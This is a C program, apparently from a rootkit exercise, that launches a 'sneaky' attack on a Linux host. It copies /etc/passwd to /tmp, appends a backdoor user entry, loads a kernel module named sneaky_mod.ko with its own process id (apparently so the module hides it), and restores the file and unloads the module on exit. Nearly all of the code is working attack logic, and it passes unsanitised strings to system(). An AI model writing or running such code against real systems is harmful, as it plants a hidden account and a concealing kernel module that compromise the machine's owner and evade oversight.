#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define MAX_LEN 100
void execute_cmd(const char* cmd, int len) {
    if(len >= MAX_LEN) {
        printf("Error: the length of command exceeds the max len\n");
        exit(EXIT_FAILURE);
    }
    system(cmd);
}

void copy_file(const char* src_file, const char* dest_file) {
    char cmd[MAX_LEN];
    int len = snprintf(cmd, MAX_LEN, "cp %s %s", src_file, dest_file);
    execute_cmd(cmd, len);
}

void add_sneaky_passwd(const char* victim_file_name, const char* sneaky_passwd) {
    FILE* victim_file = fopen(victim_file_name, "a+");
    if(victim_file == NULL) {
        perror("Fail to open victim file");
        exit(EXIT_FAILURE);    
    }
    fprintf(victim_file, "%s\n", sneaky_passwd);
    fclose(victim_file);
}

void load_sneaky_mod(const char* mod_name) {
    char cmd[MAX_LEN];
    int len = snprintf(cmd, MAX_LEN, "insmod %s spid=%d", mod_name, getpid());
    execute_cmd(cmd, len);
}

void unload_sneaky_mod(const char* mod_name) {
    char cmd[MAX_LEN];
    int len = snprintf(cmd, MAX_LEN, "rmmod %s", mod_name);
    execute_cmd(cmd, len);
}

int main() {
    printf("sneaky_process pid = %d\n", getpid());
    const char* origin_file = "/etc/passwd", *tmp_file = "/tmp/passwd", *attack_mod = "sneaky_mod.ko";
    const char* sneaky_passwd = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";

    // start attacking
    copy_file(origin_file, tmp_file);
    add_sneaky_passwd(origin_file, sneaky_passwd);
    load_sneaky_mod(attack_mod);

    // waiting quit
    int input_ch;
    while((input_ch = getchar()) != 'q') {}

    // stop attacking
    unload_sneaky_mod(attack_mod);
    copy_file(tmp_file, origin_file);
    system("rm -rf /tmp/passwd");
    return EXIT_SUCCESS;
}
